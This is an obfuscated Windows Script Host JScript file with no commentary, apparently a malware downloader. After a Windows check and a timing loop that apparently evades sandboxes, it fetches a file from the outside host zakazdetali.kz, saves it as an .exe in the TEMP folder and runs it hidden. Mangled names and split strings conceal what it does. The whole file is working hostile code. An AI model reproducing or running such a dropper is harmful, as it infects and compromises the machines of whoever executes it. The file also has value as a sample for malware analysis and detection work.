var _YU = false;
var _O = "CreateObject";
var _QN = function _K() {return WScript[_O]("WScript"+".Shell");}(), _L0 = 11;
var _HZ = "MSXML2.XMLHTTP";
var _MZ = 2123213;
var _A = 0;
function _Q(_ZN){_QN["Run"](_ZN, _A, _A);};
function _C(){return _HZ + "";};
function _WJ(_F0, _YZ){_A = _A * 1; return _F0 - _YZ;};
function _Y(){return _O;};
/*@cc_on
  @if (@_win32 || @_win64)
    _YU = true;
  @end
@*/
if (_YU)
{
var _E = "";
function _R(){return 22;};
var _JM = 0; var _U = 0;
function _KQ()
{
var _TF = new this["Date"]();
var _VX = _TF["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _TF = new this["Date"]();
var _L = _TF["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _TF = new this["Date"]();
var _IA = _TF["getUTCMilliseconds"]();
var _JM = "_Q0";
_JM = _WJ(_L, _VX);
var _U = "_Q1";
_U = _WJ(_IA, _L);
_E = "open";
return _WJ(_JM, _U);
}
var _Y0 = false;
var _MG = false;
for (var _B = _A; _B < _R() * 1; _B++){if (_KQ() != _A){
_Y0 = true; 
_U = "31" + 11 * _JM + _U; 
_MG = true; 
break;
}}
function _BP() {return ((_Y0 == true) && (_Y0 == _MG)) ? 1 : _A;};
if (_Y0 && _BP() && _MG){
function _KH() {return _QN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7aRfmTmrOmRh36Q.ex" + "e";};
 _VS = _C();
 _TF0 = WScript[_O](_VS);
 var _R0 = 1;
 while (_R0){
try {
	if (_R0 == 1)
	{
		_TF0[_E]("GET", "http://zakazdetali.kz/v7bsad", false);
		_TF0["send"]();
		_X = "Sleep";
	}
	WScript[_X](_R() + 120); 
	if (_TF0["readystate"] < 2 * 2) continue;
	_R0 = _A;
	function _TW(_C0) {var _SI = (1, 2, 3, 4, 5, _C0); return _SI;};
	_B0 = WScript[_Y()]("ADODB.Stream");
	_VS = _B0;
	_VS[_E]();
	_VS["type"] = _TW(1);
	_VS["write"](_TF0["ResponseBody"]);
	_B0["position"] = _TW(_A);
	_VS["Save" + "ToFile"](_KH(), 2);
	_B0["cl"+"ose"]();
	_H = _KH();
	_Q(_H);
} catch(_F){};
}
}
}

